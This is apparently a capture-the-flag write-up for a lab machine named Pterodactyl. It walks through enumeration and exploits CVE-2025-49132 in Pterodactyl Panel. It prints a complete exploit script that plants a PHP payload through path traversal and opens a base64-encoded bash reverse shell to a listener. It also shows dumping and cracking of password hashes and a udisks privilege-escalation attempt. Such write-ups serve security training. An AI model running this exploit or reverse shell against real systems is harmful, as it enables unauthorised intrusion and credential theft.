# Pterodactyl

<img width="1588" height="294" alt="image" src="https://github.com/user-attachments/assets/b48fab9e-a93a-4163-ad90-d7b90c843794" />

---

## Nmap Scan

```
nmap -sCV -Pn 10.129.244.106
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-25 16:33 EDT
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.70% done; ETC: 16:34 (0:00:13 remaining)
Nmap scan report for pterodactyl.htb (10.129.234.227)
Host is up (0.31s latency).
Not shown: 933 filtered tcp ports (no-response), 63 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: My Minecraft Server
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.81 seconds

```

## gobuster

```
gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://wingdata.htb/
```

<img width="1336" height="348" alt="image" src="https://github.com/user-attachments/assets/36cf4c8a-7074-4185-9b0d-2d02d711bfa7" />

- when open **`/Public`**iget **`forbidden`** 

## when click on **`changelog`** found

```
http://pterodactyl.htb/changelog.txt
```

```
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

## from this file we observe that there is two subdomains

- **`play.pterodactyl.htb`**  ===> redirect to **`pterodactyl.htb`**
- **`panel.pterodactyl.htb`** 

## when open **`panel.pterodactyl.htb`**

<img width="1473" height="665" alt="image" src="https://github.com/user-attachments/assets/18e3d590-a3b9-4cbb-b368-e472940ced9b" />

## when i search for exploit to **`Pterodactyl Panel`** found in `exploitdb`

## [CVE:2025-49132](https://www.exploit-db.com/exploits/52341)

```
python3 52341.py http://panel.pterodactyl.htb
```

<img width="746" height="89" alt="image" src="https://github.com/user-attachments/assets/a5c54e75-7bb3-4cd2-bc59-73c5700a580c" />

## boom we get **`username`** and **`password`** for database:

```
pterodactyl : PteraPanel
```

## but i cant reach it now 

## i search for another exploit and found :

## [CVE-2025-49132-dbs.py](https://github.com/dollarboysushil/CVE-2025-49132-Pterodactyl-Panel-Unauthenticated-Remote-Code-Execution-RCE-/blob/main/CVE-2025-49132-dbs.py)

```
python3 exploit.py --target panel.pterodactyl.htb --cmd id 
```

<img width="1579" height="402" alt="image" src="https://github.com/user-attachments/assets/89cdbd78-82be-4f72-83cb-bea1d0749c03" />

<img width="1381" height="179" alt="image" src="https://github.com/user-attachments/assets/e6b0e441-7e2a-4982-87dd-eaa29fcd33a4" />

## so we did RCE on id :

```
uid=474(wwwrun) gid=477(www) groups=477(www)
```

## if i try to do reverseshell it not work so i will edit exploit code :

```python
import argparse
import pycurl
import base64
from io import BytesIO
 
def parse_args():
    parser = argparse.ArgumentParser(
        prog='CVE-2025-49132 PoC by pwndalf',
        usage='exploit.py -t target.com -l 10.10.10.1 -p 9001',
        description='This script exploits Remote Code Execution vulnerability in Pterodactyl Panel < 1.11.11'
    )
 
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target domain')
 
    parser.add_argument(
        '-l', '--lhost',
        required=True,
        help='Listener\'s IP')
 
    parser.add_argument(
        '-p', '--lport',
        required=True,
        help='Listeners\'s port')
 
    parser.add_argument(
        '-P', '--pear-path',
        default='/usr/share/php/PEAR/',
        help='Path to the PHP PEAR library (default /usr/share/php/PEAR/)')
 
    return parser.parse_args()
 
def pycurl_get(url):
    buf = BytesIO()
    c = pycurl.Curl()
    c.setopt(pycurl.URL, url.encode("utf-8"))
    c.setopt(pycurl.WRITEDATA, buf)
    try:
        c.perform()
        return c.getinfo(pycurl.RESPONSE_CODE)
    finally:
        c.close()
 
def main(args):
    reverse_shell = f'/bin/bash -c "bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"'.encode("utf-8")
    encoded_shell = base64.b64encode(reverse_shell).decode('utf-8')
    
    payload = "echo${IFS}B64_BLOB${IFS}|${IFS}base64${IFS}-d|${IFS}bash".replace("B64_BLOB", encoded_shell)
    
    write_shell = f'http://{args.target}/locales/locale.json?+config-create+/&locale=../../../../..{args.pear_path}&namespace=pearcmd&/<?=system(\'{payload}\')?>+/tmp/payload.php'
    trigger_shell = f'http://{args.target}/locales/locale.json?locale=../../../../../../tmp&namespace=payload'
    
    if pycurl_get(write_shell) == 200:
        print("Shell uploaded successfully")
        pycurl_get(trigger_shell)
    else:
        print("Upload failed.")
 
 
if __name__ == "__main__":
    main(parse_args())
```

## run it

```
python3 cve.py -t panel.pterodactyl.htb -l 10.10.14.44 -p 4444
```

<img width="715" height="94" alt="image" src="https://github.com/user-attachments/assets/fbab2243-20cf-4311-9088-dfc885c0db69" />

<img width="1155" height="259" alt="image" src="https://github.com/user-attachments/assets/6a18e57c-c8cd-41a1-853d-af5ab58ab710" />

## stable shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
```

----

## in **`/home`** found two folders just one accessable and in it found **`user.txt`** : 

<img width="1076" height="269" alt="image" src="https://github.com/user-attachments/assets/97638916-f090-40c0-aac5-adab942ce1cd" />

## i aready have DB credentials let's try to enter database

```
mysql -u pterodactyl -p
```

<img width="1032" height="169" alt="image" src="https://github.com/user-attachments/assets/e34f1d9b-85b6-4988-a895-89c7cab19bc2" />

## internal services / panel abuse

```
netstat -tulpn
# or
ss -tulpn
```

<img width="1193" height="331" alt="image" src="https://github.com/user-attachments/assets/6ee068da-5abe-48dd-ab59-33d6917c57f9" />

```
mysql -h 127.0.0.1 -u pterodactyl -p panel
SHOW DATABASES;
```

<img width="1420" height="523" alt="image" src="https://github.com/user-attachments/assets/3cb43060-91b6-4069-8f2c-a2ee24bf025f" />

```
use panel;
SHOW TABLES;
```

<img width="1033" height="190" alt="image" src="https://github.com/user-attachments/assets/d645abaa-8459-4511-a122-b59e6cdfd79f" />

```
SELECT * FROM users;
```

<img width="1585" height="141" alt="image" src="https://github.com/user-attachments/assets/753a70d8-35c1-4884-bf46-94a90269e2d8" />

```
username: headmonitor
root_admin: 1
hash: $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
```

```
username: phileasfogg3
root_admin: 0
hash: $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
```

## i try to crack the first one but i couldn't but the second john cracked it

```
john hash2.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="914" height="233" alt="image" src="https://github.com/user-attachments/assets/9f91a757-c6a8-4899-b357-88830d6d0569" />

```
phileasfogg3 : !QAZ2wsx
```

## privesc

```
sudo -l 
```

<img width="1513" height="147" alt="image" src="https://github.com/user-attachments/assets/f7a067b3-e861-4cf3-8ce2-a756ee75f172" />

---

## in **`/var/mail`** found

<img width="1497" height="469" alt="image" src="https://github.com/user-attachments/assets/10969189-fe86-4e50-977d-a03a17fc62c6" />

Researching the `udisksd` Privilege Escalation
----------------------------------------------

While performing local enumeration, I previously discovered an internal email mentioning **unusual activity related to the `udisksd` daemon**. Since system administrators rarely reference specific services without reason in CTF environments, this strongly suggested that `udisksd` might be involved in a potential privilege escalation path.

To investigate further, I began researching publicly known vulnerabilities associated with the **udisks service**. During this research, I discovered a proof-of-concept exploit for **[CVE-2025-6019](https://github.com/guinea-offensive-security/CVE-2025-6019)**, which targets a flaw in the `libblockdev` component used by `udisks`. The vulnerability can allow a local attacker to escalate privileges by abusing how the daemon interacts with privileged mount operations.

```
sudo bash exploit.sh
```

```
scp exploit.sh phileasfogg3@pterodactyl.htb:/tmp/
scp xfs.image phileasfogg3@pterodactyl.htb:/tmp/
```

